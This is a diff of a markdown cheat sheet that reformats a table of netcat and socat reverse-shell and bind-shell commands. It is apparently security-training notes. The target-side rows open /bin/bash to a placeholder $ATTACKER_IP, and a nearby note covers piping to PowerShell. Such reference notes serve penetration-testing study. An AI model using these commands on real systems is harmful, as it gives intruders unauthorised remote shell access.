@@ -75,12 +75,12 @@ NOTE that in *none* of these cases will the reverse shell pick up on your termin
 
 Socat: Just an anything-to-anything connector!
 
-| Role                     | netcat                                   | socat                                                  |
-|:------------------------ |:---------------------------------------- |:------------------------------------------------------ |
-| Reverse shell (attacker) | `nc -lnp $LISTENER_PORT`                    | `socat TCP-LISTEN:$LISTENER_PORT -`                       |
+| Role                     | netcat                                        | socat                                                        |
+|:------------------------ |:--------------------------------------------- |:------------------------------------------------------------ |
+| Reverse shell (attacker) | `nc -lnp $LISTENER_PORT`                      | `socat TCP-LISTEN:$LISTENER_PORT -`                          |
 | Reverse shell (target)   | `nc $ATTACKER_IP $LISTENER_PORT -e /bin/bash` | `socat TCP:$ATTACKER_IP:$LISTENER_PORT EXEC:"/bin/bash -li"` |
-| Bind shell (attacker)    | `nc $TARGET_IP $LISTENER_PORT`              | `socat TCP:$TARGET_IP:$LISTENER_PORT`                      |
-| Bind shell (target)      | `nc -lnp $LISTENER_PORT -e /bin/bash`        | `socat TCP-LISTEN:$LISTENER_PORT EXEC:"/bin/bash -li"`      |
+| Bind shell (attacker)    | `nc $TARGET_IP $LISTENER_PORT`                | `socat TCP:$TARGET_IP:$LISTENER_PORT`                        |
+| Bind shell (target)      | `nc -lnp $LISTENER_PORT -e /bin/bash`         | `socat TCP-LISTEN:$LISTENER_PORT EXEC:"/bin/bash -li"`       |
 
 This gets us an interactive login shell right out the gate, though we're still vulnerable to Ctrl+C. Note that when binding to PowerShell, use `powershell.exe,pipes` in order to force PowerShell to use UNIX-style STDIN/STDOUT.
 
